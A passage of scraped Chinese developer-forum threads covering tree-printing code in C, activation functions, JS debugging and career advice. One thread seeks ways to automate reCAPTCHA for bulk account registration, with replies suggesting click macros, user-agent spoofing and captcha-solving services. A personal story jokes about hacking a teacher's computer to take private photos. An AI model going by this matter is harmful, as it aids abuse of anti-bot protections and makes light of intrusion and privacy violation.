堆栈为空，不存在所谓回溯点，<strong>我们将回溯位置索引设为 0 ，这有两重含义，一来表示该回溯点无效或不存在，二来既然没有回溯，那么接下来就从当前节点的第一个分支开始遍历。</strong></p>\n<p>然后我们将遍历过的节点压栈，这里也是有区分的：<strong>如果当前是叶子节点，或者所有分支都遍历完了，那么应该继续上溯去寻找回溯点，</strong>我们就将回溯点设为无效后压栈；否则就将当前节点设为回溯点，并记录位置索引后压栈。</p>\n<p>画线输出部分稍后讲。我们根据前面获取的索引 sub_idx 进入下一层，直到触底回溯，这时从 log 堆栈弹出回溯点， pop 有三种情况：由于第一个压栈为根节点，堆栈为空表示回溯到原点，也就标志着整个遍历结束，退出循环；否则查看回溯点是否为 NULL ，如果空如前所述继续上溯；如果存在有效回溯点，则将回溯位置索引取出，继续下一轮遍历循环。</p>\n<p>最后讲终端输出。前面说过<strong>每一行从左至右的输出的是树的层次遍历，其实就是遍历 log 堆栈；换行输出就是树的分支遍历，就是每一轮循环。</strong>输出内容主要是三个符号：缩进、分支和节点内容。我们作如下策略：</p>\n<ul>\n<li>缩进：当堆栈里回溯点无效，则不存在分支，打印空格，八个字符对齐；</li>\n<li>分支：当堆栈里回溯点有效，表示存在分支，打印“|”和空格，八个字符对齐；</li>\n<li>节点：当堆栈遍历到最后一个元素，表示后面将要输出节点内容，打印“+---”，八个字符对齐，后面跟节点内容。</li>\n</ul>\n<p>当然你也可以自定义打印策略以便输出更美观。好了，说了一大堆，看效果吧，运行程序，一目了然。</p>\n<img src=\"https://static.oschina.net/uploads/img/201702/06211345_ILBk.png\">\n<h2>B+树</h2>\n<p>代码<a href=\"https://github.com/begeekmyfriend/bplustree\" rel=\"nofollow\">在此</a>。 B+树是关系数据库常用的底层数据结构，实现起来相当恐怖，所幸本文不讲这些，这里只是将 B+树作为多叉树示范如何打印，特别是叶子节点和非叶子节点本身定义不同的情况下。从输出实现上我们发现， log 对象记录的只是节点的指针和回溯位置，同数据节点本身没有关系。我们几乎可以原封不动地把上面的代码搬过来，运行效果如下：</p>\n<img src=\"https://static.oschina.net/uploads/img/201702/06211805_esIo.png\">\n<p>从形状上可以看到 B+树的真实数据都存储在叶子节点，而且整棵树是平衡的。</p>\n<h2>红黑树（二叉树）</h2>\n<p>代码<a href=\"https://github.com/begeekmyfriend/rbtree\" rel=\"nofollow\">在此</a>。理解了多叉树的实现，二叉树不过是一种特殊简化形式罢了。本文挑选了红黑树为代表，代码自己懒得写了，直接拿 Nginx 源码。</p>\n<p>观察得出，二叉树关于回溯点的位置其实只有右边分支，也就是说回溯位置索引只有一个值，就是 1 。这样一来我们可以做个简化，将左分支索引设为 0 表示无效回溯位置，右分支索引设为 1 表示有效回溯位置，代码可以这样写：</p>\n<pre><code>#define RBTREE_MAX_LEVEL   64\n#define RBTREE_LEFT_INDEX  0\n#define RBTREE_RIGHT_INDEX 1\n\nvoid rbtree_dump(struct rbtree *tree)\n{\n    int level = 0;\n    struct rbnode *node = tree-&gt;root, *sentinel = tree-&gt;sentinel;\n    struct node_backlog nbl, *p_nbl = NULL;\n    struct node_backlog *top, *bottom, nbl_stack[RBTREE_MAX_LEVEL];\n\n    top = bottom = nbl_stack;\n\n    for (; ;) {\n        if (node != sentinel) {\n            /* Fetch the pop-up backlogged node's sub-id. If not backlogged, set 0. */\n            int sub_index = p_nbl != NULL ? p_nbl-&gt;next_sub_idx : RBTREE_LEFT_INDEX;\n            /* backlog should be reset since node has gone deep down */\n            p_nbl = NULL;\n\n            /* Backlog the node */\n            if (is_leaf(node, sentinel) || sub_index == RBTREE_RIGHT_INDEX) {\n                nbl.node = sentinel;\n                nbl.next_sub_idx = RBTREE_LEFT_INDEX;\n            } else {\n                nbl.node = node;\n                nbl.next_sub_idx = RBTREE_RIGHT_INDEX;\n            }\n            nbl_push(&amp;nbl, &amp;top, &amp;bottom);\n            level++;\n\n            /* Draw lines as long as sub_idx is the first one */\n            if (sub_index == RBTREE_LEFT_INDEX) {\n                /* Print intent, branch and node content... */\n            }\n\n            /* Move down according to sub_idx */\n            node = sub_index == RBTREE_LEFT_INDEX ? node-&gt;left : node-&gt;right;\n        } else {\n            /* Pop up the node backlog... */\n        }\n    }\n}\n</code></pre>\n<p>让我们看一看输出效果……等等，我们发现对于二叉树，右孩子在左孩子的下一行打印，视觉上有点不习惯是吗？还好我贴心地将 LEFT_INDEX 和 RIGHT_INDEX 交换了一下次序，右孩子就先于左孩子输出了，这样一来你就可以歪着脑袋直观地看二叉树了（笑），同时我们还知道，“翻转”一棵二叉树是多么容易（笑）。</p>\n<img src=\"https://static.oschina.net/uploads/img/201702/06212006_glT5.png\">\n<p>工欲善其事，必先利其器。学会了树形结构打印工具，针对这样的数据结构，只有你写不了的，没有你写不对的。最后给出一个思考题：如何用递归形式实现打印树形结构？（提示：利用参数传递）</p>\n<h2>参考源码</h2>\n<p><a href=\"https://gist.github.com/begeekmyfriend/431fd388e74b9c698b4a\" rel=\"nofollow\">目录树</a>\n<a href=\"https://github.com/begeekmyfriend/bplustree\" rel=\"nofollow\">B+树</a>\n<a href=\"https://github.com/begeekmyfriend/rbtree\" rel=\"nofollow\">红黑树</a></p>\n</div></div>"], "reply": "6", "tittle": "树形结构的调试打印", "comment": ["给你点赞", "不错，可以试试输出 Graphviz dot 之后直接渲染成图片", "\r", "\r", "画出来是这样的：\r", "\r", " 你这是 git 分支画法", " 你这是 git 分支画法，但遇到多叉树就麻烦了", "不错，我自己原来写过一个打印的，是横着分层排列的，命令行下面很有挑战性，如果同一层级上面节点个数一个屏幕显示不下就很麻烦，所以我每次做实验都是最多不超过 xx 个节点，你这个比我当初那个好多了。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本文首发于个人博客：<a href=\"https://livc.io/176\" rel=\"nofollow\">https://livc.io/176</a>  因 v 站不支持 LaTeX ，有需求请移步原文阅读。</p>\n<p>本文为 <a href=\"http://cs231n.stanford.edu/\" rel=\"nofollow\">CS231n</a> 中关于激活函数部分的笔记。</p>\n<p><a href=\"https://en.wikipedia.org/wiki/Activation_function\" rel=\"nofollow\">激活函数</a>（ Activation Function ）能够把输入的特征保留并映射下来。</p>\n<h2>Sigmoid</h2>\n<p>Sigmoid 非线性函数将输入映射到 $$ \\left( 0,1\\right) $$ 之间。它的数学公式为：$$\\sigma \\left( x\\right) =\\dfrac {1} {1+e^{-x}}$$。</p>\n<img src=\"https://upload.wikimedia.org/wikipedia/commons/thumb/8/88/Logistic-curve.svg/600px-Logistic-curve.svg.png\">\n<p>历史上， sigmoid 函数曾非常常用，然而现在它已经不太受欢迎，实际很少使用了，因为它主要有两个缺点：</p>\n<h4>1. 函数饱和使梯度消失</h4>\n<p>sigmoid 神经元在值为 0 或 1 的时候接近饱和，这些区域，梯度<strong>几乎为 0</strong>。因此在<a href=\"https://en.wikipedia.org/wiki/Backpropagation\" rel=\"nofollow\">反向传播</a>时，这个局部梯度会与整个代价函数关于该单元输出的梯度相乘，结果也会接近为 0 。</p>\n<p>这样，几乎就没有信号通过神经元传到权重再到数据了，因此这时梯度就对模型的更新没有任何贡献。</p>\n<p>除此之外，为了防止饱和，必须对于权重矩阵的初始化特别留意。比如，如果初始化权重过大，那么大多数神经元将会饱和，导致网络就几乎不学习。</p>\n<h4>2. sigmoid 函数不是关于原点中心对称的</h4>\n<p>这个特性会导致后面网络层的输入也不是零中心的，进而影响梯度下降的运作。</p>\n<p>因为如果输入都是正数的话（如 $$f=w^{T}x+b$$ 中每个元素都 $$x&gt;0$$ ），那么关于 $$w$$ 的梯度在反向传播过程中，要么全是正数，要么全是负数（具体依据整个表达式 $$f$$ 而定），这将会导致梯度下降权重更新时出现 z 字型的下降。</p>\n<p>当然，如果是按 batch 去训练，那么每个 batch 可能得到不同的信号，整个批量的梯度加起来后可以缓解这个问题。因此，该问题相对于上面的神经元饱和问题来说只是个小麻烦，没有那么严重。</p>\n<h2>tanh</h2>\n<p>tanh 函数同样存在饱和问题，但它的输出是零中心的，因此实际中 tanh 比 sigmoid 更受欢迎。</p>\n<p>tanh 函数实际上是一个放大的 sigmoid 函数，数学关系为：$$\\tanh \\left( x\\right) =2\\sigma \\left( 2x\\right) -1$$</p>\n<img src=\"http://mathworld.wolfram.com/images/interactive/TanhReal.gif\">\n<h2>ReLU</h2>\n<p><a href=\"https://en.wikipedia.org/wiki/Rectifier_(neural_networks)\" rel=\"nofollow\">ReLU</a> 近些年来非常流行。它的数学公式为：$$f\\left( x\\right) =\\max \\left( 0,x\\right) $$。</p>\n<img src=\"http://cs231n.github.io/assets/nn1/relu.jpeg\">\n<p>$$w$$ 是二维时， ReLU 的效果如图：</p>\n<img src=\"http://7pn4yt.com1.z0.glb.clouddn.com/blog-relu-perf.png\">\n<p>ReLU 的优点：</p>\n<ol>\n<li>相较于 sigmoid 和 tanh 函数， ReLU 对于 SGD 的收敛有巨大的加速作用（<a href=\"http://www.cs.toronto.edu/%7Efritz/absps/imagenet.pdf\" rel=\"nofollow\">Alex Krizhevsky</a> 指出有 6 倍之多）。有人认为这是由它的线性、非饱和的公式导致的。<img src=\"https://ws1.sinaimg.cn/large/9cd77f2egy1fcfm229cjaj20k40ge3z4\"></li>\n<li>相比于 sigmoid/tanh ， ReLU 只需要一个阈值就可以得到激活值，而不用去算一大堆复杂的（指数）运算。</li>\n</ol>\n<p>ReLU 的缺点是，它在训练时比较脆弱并且**可能“死掉”**。</p>\n<p>举例来说：一个非常大的梯度经过一个 ReLU 神经元，更新过参数之后，这个神经元再也不会对任何数据有激活现象了。如果这种情况发生，那么从此所有流过这个神经元的梯度将都变成 0 。</p>\n<p>也就是说，这个 ReLU 单元在训练中将不可逆转的死亡，导致了数据多样化的丢失。实际中，如果学习率设置得太高，可能会发现网络中 40% 的神经元都会死掉（在整个训练集中这些神经元都不会被激活）。</p>\n<p>合理设置学习率，会降低这种情况的发生概率。</p>\n<h2>Leaky ReLU</h2>\n<p>Leaky ReLU 是为解决“ ReLU 死亡”问题的尝试。</p>\n<p>ReLU 中当 x&lt;0 时，函数值为 0 。而 Leaky ReLU 则是给出一个很小的负数梯度值，比如 0.01 。</p>\n<img src=\"http://lamda.nju.edu.cn/weixs/project/CNNTricks/imgs/leaky.png\">\n<p>有些研究者的论文指出这个激活函数表现很不错，但是其效果并不是很稳定。</p>\n<p>Kaiming He 等人在 2015 年发布的论文 <a href=\"https://link.zhihu.com/?target=http%3A//arxiv.org/abs/1502.01852\" rel=\"nofollow\">Delving Deep into Rectifiers</a> 中介绍了一种新方法 PReLU ，把负区间上的斜率当做每个神经元中的一个参数来训练。然而该激活函数在在不同任务中表现的效果也没有特别清晰。</p>\n<h2>Maxout</h2>\n<p>Maxout 是对 ReLU 和 Leaky ReLU 的一般化归纳，它的函数公式是（二维时）：$$\\max \\left( w_{1}^{T}+b_{1},W_{2}^{T}+b_{2}\\right) $$。 ReLU 和 Leaky ReLU 都是这个公式的特殊情况（比如 ReLU 就是当 $$w_{1},b_{1}=0$$时）。</p>\n<p>这样 Maxout 神经元就拥有 ReLU 单元的所有优点（线性和不饱和），而没有它的缺点（死亡的 ReLU 单元）。然而和 ReLU 对比，它每个神经元的参数数量增加了一倍，这就导致整体参数的数量激增。</p>\n<h2>如何选择激活函数？</h2>\n<p>通常来说，很少会把各种激活函数串起来在一个网络中使用的。</p>\n<p>如果使用 ReLU ，那么一定要小心设置 learning rate ，而且要注意不要让你的网络出现很多 “ dead ” 神经元，如果这个问题不好解决，那么可以试试 Leaky ReLU 、 PReLU 或者 Maxout.</p>\n<p>最好不要用 sigmoid ，可以试试 tanh ，不过可以预期它的效果会比不上 ReLU 和 Maxout.</p>\n</div></div>"], "reply": "14", "tittle": "[机器学习]常用激活函数的总结与比较", "comment": ["看了下楼主简历已被吓尿…", "楼主很强势", "请问，，， 0 基础能搞深度学习么", "楼主再介绍一下高斯函数的拟合与 sigmod 的对比。", " cs231n 你值得拥有", "  一般用 Octave 吗？", "翻译的不错。英文基础不错的同学可以直接看原文 ", " #3 当然是可以的，现在网络 MOOC 资源这么丰富，足不出户就可以学习到名校课程，有一定自学能力的话绝大部分知识都不需要老师来教了。\r", "\r", "入门一个新领域需要两个方面的支持，一个是兴趣，另一个是需求。\r", "\r", "入门 Deep learning 的过程，按照顺序我的建议是：\r", "\r", "  1. 周志华的《机器学习》\r", "  2. Andrew Ng 在 Coursera 的 Machine Learning 课程\r", "  3. Udacity 的 Deep Learning 课程 谷歌工程师讲的那个\r", "  4. 斯坦福 李飞飞 CS231n\r", "\r", "这些看完就了解和理解大部分知识了，对于数学功底，我不建议去啃所有数学公式，因为对于 AI 或 Deep Learning 工程师来说，并不一定要像做研究那样完全理解公式。同时，数学可能是很多人对 Deep Learning 望而却步的一个原因。\r", "\r", "总之，你要想清楚自己为了什么去学习 Deep Learning ，如果是面试，可能了解这些基础知识就够了；如果做工程，还要和分布式、 k8s 等等联系在一起；如果做研究，不读大量论文肯定是不行的。", " 这两篇翻译有点像啊", " #9 \r", " #10 写的时候确实参考了一些中文资料，最近才整理发成博客，我还是以公开课和讲义为主的，谢谢指出。", "更新一下引用 感谢楼上指出\r", "\r", "参考资料\r", "\r", "\r", "\r", "\r", "CS231n 确实是一个不错的课程，不管是不是准备做 AI 方向，多了解一些总没坏处。", "CS231n 很多没有中文字幕看,着急啊~\r", "\r", "杜克的在知乎顶过了~", "膜啊，可以的~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前想批量注册一个网站的账号，但是其注册页面有 recaptcha ，貌似只需要点击一下就通过验证了，虽然感觉破解谷歌的验证码无异于蚍蜉撼树，但还是想尝试一下，先 chrome 抓包，一大堆字符串完全不知所云，放弃。再用 phantomjs 试试，结果 phantomjs 截图压根儿就不显示该验证码，所以目前准备能不能用 chrome 的 console 来批量点击该验证码？求热心 V2 们帮助一下，谢谢</p>\n</div></div>"], "reply": "28", "tittle": "怎样在 chrome 中模拟点击 Google 的 reCaptcha？", "comment": ["这个验证码没那么简单的，见： ", "人家充分从用户体验考虑，既然真实用户能快速通过验证，又要最大限度的防止机器人\r", "不然几亿几亿的科研经费不是打水漂？", "可以试下打码！", "\r", "\r", "只会帮你点击一下的插件...什么输入数字啦点击图片啦还得自己来", " 谢谢，但是明明没有弹出图片啊？？？就一个复选框，点击后变成一个绿色钩钩", " #6 那你可以试试这个插件", "前一阵子看到个 gif 图, 使用带有触摸板的笔记本, 使用机械臂操控触摸板来点击 reCaptcha", "详细视频地址:", "详细视频地址:\r", "要能模拟出来，就不做这个验证了", "我很好奇 5 楼那个 extension 能通过验证么", "谷歌这个验证码想办法模拟点击那个复选框，但等你多点两次之后，那那个复选框就选中后就不会直接通过了，而是会进入传统的图片验证码。\r", "\r", "人家的这个 reCaptcha 就是 根据你的 ip 啊 系统信息之类一堆乱七八糟的信息确定你这个用户近期在有 google 验证的网站上的操作是不是像一个机器人， 如果稍有一些疑似那就会在复选框之后弹出传统验证码 让你验证。", " 目前一口气点了十多次，还是一个复选框，没任何图片显示", "按键精灵..", " 那是因为 google 还认为你是人点的，不是程序或者机器点的", " #14 \r", "recaptcha: 愚蠢的人类", "autohotkey 模拟应该可用", "\r", "前段时间在 Twitter 上看到的，应该用了图像识别然后定位，强行模拟人类的动作，虽然蠢蠢的，但是也是一种破解办法", "能搞定这个的，一大堆抢票公司会来联络购买的，实现一个小目标？", " 我看到到捏了一把汗", " 新版验证已经不用你点那个对勾了", " 这个没有实际价值的。 reCaptcha 会查你在 Google 的 cookies ，有九天及以上历史记录才会给你 ✓，此外一个用户一天只有九次直接通过的机会（几年前的数据，最新的不知道）。如果浏览器和电脑的任何信息被发现有虚假成分，比如伪造 ua ，就会直接出图片或者文字验证码。具体用到的技术包括但不限于 canvas 绘图浏览器指纹。", " #22 同在用 invisible reCAPTCHA 2333", "对量大了还是会要求图片验证的。", " 6666666", "可以通过模拟 UA 实现出图片验证码\r", "然后去打码…", " #19 lmao"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前在研究一个网页，它的 token 值我研究了一天都不知道他是从何而来的， chrome 抓包分析也抓不出来，也许是 js 某个加密函数生成的吧，但是这个 js 文件大小就是 1M ，比较大，而且变量全都是混淆了的，难以读懂，有没有什么工具或者方法能够研究出这个 token 变量值是怎样一步一步最终生成的？</p>\n</div></div>"], "reply": "5", "tittle": "如何查看 js 中一个变量值是怎样一步一步生成的？", "comment": ["靠经验设置断点，一步一步 step forward.", "如果你知道变量名，可以通过 Object.defineProperty(obj,变量名，{set: function(){console.trace();}} );可以追踪到何时被赋值，何时被修改", "  这样的话 赋值语句就不会生效了吧", " \r", "\r", "o._value = o.value\r", "\r", "Object.defineProperty(o, 'value', {\r", "    get: function() {\r", "        console.trace();\r", "        return o._value;\r", "    },\r", "    set : function(val) {\r", "        console.trace();\r", "        o._value = val;\r", "    }\r", "});", "把网站发出来让大家看看啊"]},
{"content": ["<div class=\"topic_content\">背景：上海垃圾二本文科生会计专业，大二在读。\r<br>\r<br>      从小喜欢电脑，初中开始就想当一个程序员。但是数学很差，然后文科生不能选择计算机专业就读。\r<br>首先毕业后我肯定不会考虑做一个会计，如果不能当码农，那我就打算做自己的第二爱好， HR 。大二读了一学期，越来越不喜欢自己的专业\r<br>\r<br>      所以我现在想知道，没有编程基础，数学不行，而且自认为不算聪明，能通过自学或者参加培训当码农吗。\r<br>然后我真的很喜欢，而且这是我一直以来的梦想，如果去做，我肯定会很努力的</div>", "<div class=\"topic_content\">看到一句话：非数学专业或者文科并不是学编程的障碍，但关键在于数学背后的逻辑思维能力，这决定了一个人最终能够在这个行业上取得的上限。</div>"], "reply": "82", "tittle": "大家好，我是追求梦想做一个码农呢还是安于现状读下去", "comment": ["Just do it.", "你也可能只是想写些有趣的东西，上班几个月发现码农对我也是挺无趣的，后来不干这个了，平常用技术写些有用的软件。", "当个兴趣就好了, 我也是玩", "如果真的很努力，学会基本的编程技能是一定可以的，这个对智商要求不高，大量练习就行。但能不能找到好工作就要看际遇了，毕竟学历卡住了，只能先进小公司做起。", " 感谢鼓励，可是现在犹豫，毕竟学历摆在这了，而且对自己的学习能力存疑", " 是的，想写有趣的东西，不知道半路出家的是否可行", " thx4 reply ，我打算最近开始看起一些入门的", " 感谢回复。如果真的是可以圆梦，小公司做起来我也是可以的，不在于能最后能达成什么，只是不想下半辈子做自己不喜欢的工作", "可以试试吧。有些小时候数学很差的都成了数学家呢。你数学差只是按某些评判标准差，实际是怎样的也很难说", " 哈哈哈，人家成为数学家 IQ 是摆在那的呀~恩，实际情况都要靠一步一步走起来的", " 学历就别说了。我还是一大专生呢。", "Do  It.", "数学不行就是天花板", " 感谢共勉~", " thx bro", "我也是文科生，初中开始就一直在开发网站，现在大一。自己喜欢为啥不赶快下手？", " 是的，数学思维限制了上限，因为数学是 IQ 的指标，，，所以能做一个养活自己的码农就 OK 了（我的目标）", " 初中和高中其实一直有在折腾，只是没有系统的学习编程的。然后高中的时候因为父母的关系，不能长时间接触电脑&那时候算是意识还没觉醒吧。于是就折腾 Android 了……", "你自认为你数学差在哪里？\r", "也可以先自学一下算法，看是否能理解", " 大概高中数学 120 分撑死了（上海文科卷），然后大学的微积分没上过课，考试靠同学的。。。", " 我也没系统学，现在既然都大学了，想学什么多容易", " thx ，最近就打算开始入手了", "Just do it.\r", "同文科生，已转行前端，坚定信心，学下去就行", "看到一句话。非数学专业或者文科并不是学编程的障碍，但关键在于数学背后的逻辑思维能力，这决定了一个人最终能够在这个行业上取得的上限。", " 我也打算去看看前端的~", "yes. just fuck it.", "换专业……", "同样是数学差，却怀着一颗程序改变世界的心^_^", "并不认为学历差或数学差 就进不了这行。。。凡事努力做到上限，收获是肯定的。", "有些人十几岁就已经写出全世界都很受欢迎的产品。如果你真的很喜欢写程序，根本不会进了大学才问这种问题。想做一个码农在现代社会只需要一台电脑而且能上网。也许你只是想换个环境而已，搞清楚自己喜欢的到底是什么，不然到时候还要后悔一次。大把人学了计算机最后不当码农。", "码农并没有你想象的那么好，搬砖的是大多数，和你的理想有很大差距，如果你能接受的话，不妨试一试", "首先楼主你要想想，你喜欢当码农的哪里。我一开始也是以为自己喜欢写代码，后来发现，自己真正喜欢的是通过各种方式解决各种问题，写代码只是解决问题的一种方式而已。\r", "\r", "要搞清楚自己的真实需求，而且你还大二，还有大量的时间，有时间就有机会。我建议你利用业余时间（比如暑假）找一些实习，各种行业，感兴趣不感兴趣都可以去试试，接触的多了你才知道自己真正想要什么。\r", "\r", "还可以报个培训（相对便宜的，别一步到位总想来个好的），也是了解的一个途径。真的有兴趣，就接着写下去。下一个假期也可以找个公司实习。说不定跟产品经理一对接，楼主你发现你其实喜欢当产品经理呢。\r", "\r", "趁年轻，多尝试。", "首先楼主问下自己：你是为了生计而想转程序员，觉得工资高好找工作？还是你有极大的爱好，觉得程序好玩想一探究竟？\r", "\r", "以上无论你基于哪点，首先想说的：无论怎样，有梦想就去追，因为你还年轻！\r", "\r", "作为一个非计算机专业，毕业后才转程序员的人告诉你：如果你是前者，请放弃！因为 IT 行业需要永远的学习新知识，了解新技术，没有足够的喜爱支撑，你基本上只有被后浪拍死的份。如果你是后者，就大胆的干吧。你都能来到这里，说明你的知识储备足够你在程序员的道路走下去，不用怀疑。", "r#33 \r", "过一遍科班的 算法数据结构 再来谈这个问题，脑子好使的话，\r", "觉得不是多么烧脑的话 就来当码农吧\r", "\r", " #33 \r", "至于这位兄台说的技术变化快，我是不赞同的，你要是把编程的基础玩的好，\r", "那些框架技术什么的都是换汤不换药的东西，学会一门 另外换一个 那只是小 case 的问题", "码农很容易当，但是这么当就有很多种了，先不要考虑天花板的事情吧，绝大多数人碰不到的地方。", "不是所有人都能拯救世界，我就是码农界的一个搬砖工", "做什么码农啊，读会计多好，将来进驻四大会计所，月薪千万，码农整天敲来敲去的一点意思没有", "我认为靠的是 “兴趣”  “爱号”  不少人都走了混口饭吃的路子", "首先说一遍，计算机编程 大多程序员用到的 都是离散数学方面的知识，主要是图论等数学方向，\r", "并不像微积分 等领域那样烧脑\r", "\r", "做图形 等领域的话 就会用到高深的数学知识，一般人也不会做那些领域", "自学转行。", "1. 你才大二\r", "2. 算法、数据结构是科班和非科班程序员差距主要体现的地方\r", "\r", "我是商科的，走过的坑希望你能绕过去", "只当码农的话，数学彻底没用，别被误导了", "毕业了再说，转行并不容易。\r", "\r", "搬砖的程序员要多少有多少，不要轻易加入搬砖的队伍。", "数学不好为什么相当码农很好奇，是觉得编程牛逼么？", "非数学专业或者文科并不是学编程的障碍，但关键在于数学背后的逻辑思维能力，这决定了一个人最终能够在这个行业上取得的上限。\r", "\r", "再告诉楼主句话\r", "\r", "以一般人的努力程度而言，根本轮不到比较天赋。（大概这个意思）\r", "\r", "下限没到就想上限，你是不是脱线？ 你知道这行肯努力就能干就行了。\r", "\r", "Ps ：大多张嘴闭嘴兴趣天赋的人，努力也都是在嘴上。", "刚入行时的前同事大牛，文科学校英语系毕业，学校里开始建论坛 /IT 能人的样子，令人敬佩的学习能力和持久的热情，一直奋斗在第一线，十年过去了，从当初的“网络总监”成为某著名世界一线公有云企业的架构师，同时成家立业周游世界。", "数学好的才不当码农 /搬砖呢，混金融圈玩统计和算法了。", "做码农兴趣是促使你在遇到重大困难时坚持下去的重要因素，没兴趣的人根本坚持不下去。\r", "不是开玩笑的，你喜欢干这行多难都能干下去，自己愿意研究才能比别人更快的进步。\r", "这行业也有很多混吃等死的，干了 3 5 年还是那点水平 一辈子吃老本也饿不死。\r", "\r", "看到你最后写的那句话感觉其实并没有什么用，因为这个行业的人 98%的人都触碰不到上限的。\r", "要学的东西真的太多太多了。", "你可以先尝试着写一点简单的 html 或者随便什么感兴趣的东西做个小 demo 。\r", "\r", "没有任何编程基础这句话一说出来就很让人绝望啊~", "做，昨天在看抑郁症治疗有这么一句：不要过于纠结过去与将来的事情，你现在做的事情就是你的目标", "既然你问这样的问题，我劝你还是不要做码农好。\r", "\r", "没有用实际行动追求过的梦想，只是个幻像。你只是不喜欢现状，想出一个幻像骗自己而已。", "我很好奇，为什么从小喜欢，为什么还不会编程呢？你从初中到大学都干了啥，我想你可能不是真喜欢。", "好好学号专业知识，不比码农差。很多时候我们不是爱一行干一行，干一行爱一行也是本事", "你做任何决定都是对的。世界上本来就有无数种可能。跟从你的内心，只要你内心足够强大。", " 在理，那些非专业的爱好者说喜欢编程，敢说只是喜欢玩电脑而已。并不喜欢编程~~\r", "\r", "对于楼主，老老实实能花个几年年考个注册会计师~金饭碗，下辈子比 95%的程序员都要安逸。 N 年考不上，学编程也没用。", "Just do it.", "能作会计就不要当码农了，四十多岁的老会计可以找工作，四十多岁的老码农可是没人要的。", "当码农也是一种梦想？去工地搬砖也能成为梦想吗？\r", "不过是混口饭吃的职业罢了", "自己摸索肯定没系统学习好咯，想系统学习就转专业咯，哈哈。\r", "\r", "自学会计学 vs 自学计算机科学，掂量一下哪个难度大，再考虑要不要自学 还是转专业", "看到卤煮的帖子就知道最多答复应该是“去做吧”。。。不过我觉得，你先找一本谭浩强 c 语言，一本清华出版社的数据结构，利用课余时间看看，再说。\r", "\r", "如果卤煮觉得看完 30%之后没有头晕，眼花，胸闷，想吐的感觉的话，表示你和计算机交互还有些天赋。", "(´･_･`) 码农也不一定要数学好吧？天赋、耐心、抗压才是最重要的。\r", "\r", "还有就是做码农也不要做设计。\r", "\r", "千万别学设计！\r", "千万别学设计！\r", "千万别学设计！", "现在网络上这么多 mooc 资源", "可以看看我写的一些主题，相互交流，我现在就是码农，准备升级做外包管理，让别人帮我写代码，我负责接单，审核，收款，发放外包报酬等工作。", "本科方向图形学，然而卵都不知道 233 早忘光了", "其实你并没有真的喜欢写代码这个行当， 真的， 否则不会来问了", "如若钟爱，便行此路。", "先去找本 c 或者 java 的书看看，看上一小时你就知道你到底是不是真的喜欢计算机", "感谢大家的回复，抱歉不能一一回复。回答一些大家的疑问\r", "1 ，为什么说喜欢计算机，但是初中到 现在基本没有行动\r", "很惭愧，的确我到目前为止的，配不上说喜欢计算机，原因很多，主要是家庭方面的，然后我高复过一年，本来也就打算混个文凭有个本科学历以后靠关系混个差事过下半辈子了。目前读的专业自己不怎么喜欢\r", "\r", "2 ，大家觉得我目前只是一时的兴起，然后那么犹豫，做不了什么\r", "恩，的确有一些冲动的成分在里面，但是我也是这段时间有过思考，我个人目前有 3 个方向， 3-1 ，混下去， 3-2 ，追求一下自己喜欢的编程， 3-3 ，从事第二喜欢的 HR 方向\r", "\r", "3 ，围城中的很多前辈表示这也就是混饭吃的技能，说不上梦想\r", "那我觉得可能是个人成长过程中的一些事吧，从而影响到我的", "如果楼主打算在大城市生活的话（家境尚可 or 打算漂一辈子），那么转，一定要转。\r", "\r", "不谈理想，只说现实。码农在一线城市的职位性价比是最高的，学历要求不高，能力要求不高，薪资挺不错。\r", "\r", "码农的晋升路线是转管理。即未来在中小公司当一个总监或者 CTO 。\r", "\r", "纯技术线需要学历和运气，一般也就大公司用得上纯技术大牛。", " 建议你先弄清楚码农、 HR 每天是做什么的再选择吧。如果没弄清楚，你的喜欢可能是盲目的。\r", "个人觉得 HR 就是一个帮用人部门擦屁股的:)", " 我家上海，女朋友北京人，所以基本脱离不开这两地方了。按照您所说，我最近也在着手学习编程了", " 家里亲戚有 HR 相关的也有会计的，所以还是对工作有所了解，近亲中没有单纯的码农， IT 工作的有，同学有学编程的，所以了解少一点", "我感觉从你这个标题，已经看出你做好了自己的决定……", "初中开始学习编程，大学读了会计，毕业当几年码农，考上了公路局，因为读的是会计又被财政抽调。如今负责工程采购预算评审。其实，干一行爱一行，本身就很不简单。没必要这么冲动。", "同行！我也是垃圾本二财务会计，还学了五年，还是法律方向的，你比我好多了。现在做程序员从业 2 年了，做过后端和安卓，目前 iOS 。找工作看的最多的还是专业背景，没有背景你必须要忍受歧视，比一般的计算机专业学生更厉害才能获取到面试机会，这很难， good luck 。", "喜欢就行，和数学没啥关系。也有数学好代码烂的人。", "编程更考查一个人的叙事能力是不是清晰，这一点上某些文科的人比理科的人做的还好。说数学和逻辑思维之间有什么关系纯属误解，有点相关性但不大。而且编程也不需要用到很复杂的逻辑，能做到看问题说事情稳准狠，不颠三倒四就可以了。", " 的确，表现出了一些个人的倾向。提问主要是为了获得专业或者从业前辈的指导", " 谨记", " thx bro ！", " 感谢回复，我在这方面会注意并且加以练习的（可以说是练习吧。。。）", "数学不行就算了吧。"]},
{"content": ["<div class=\"topic_content\">我叫计划，1989年我于一个阳光明媚的早上呱呱坠地！\r<br>       2000年，我家门口开了一家小网吧，第一次互联网泡沫，那时候还是5元钱一小时，56k猫的速度打开一个网页都要好几分钟，但是我立刻就被眼花缭乱的网页深深的迷住了双眼，以至于我爸经常要拿着皮鞭来网吧寻我。\r<br>       2004年，我舅舅家装了宽带，刚上高中的我经常找着各种借口去我舅舅家蹭网，那时候偶然获得一本frontpage开发指南，花了一下午的时间一口气全部看完！\r<br>       2005年，16岁的我接触了一本杂志，叫做《黑客X档案》，从此一发不可收拾，每天早上6点起来不是背英语，而是偷偷的研究杂志里的各种入侵注入方法，有一次课堂上在众目睽睽下，入侵了我们数学老师的电脑并成功获取了他未婚妻的美照：）\r<br>       2006年，因为长时间研究编程，我的成绩一落千丈，父母隔断了一切我和电脑有关的东西，老师同学对我的看法也发生了别样的变化，那一年，我感受到了深深的孤独与悲伤。\r<br>       2007年，我考上了一所二本大学，满心欢喜的报了计算机专业，结果因为成绩不够被调剂到了别的专业，我很迷茫，不知道未来的路该如何前行，那一年，我接触到了魔兽争霸，在虚拟世界的PK中挥霍自己的青春岁月。\r<br>       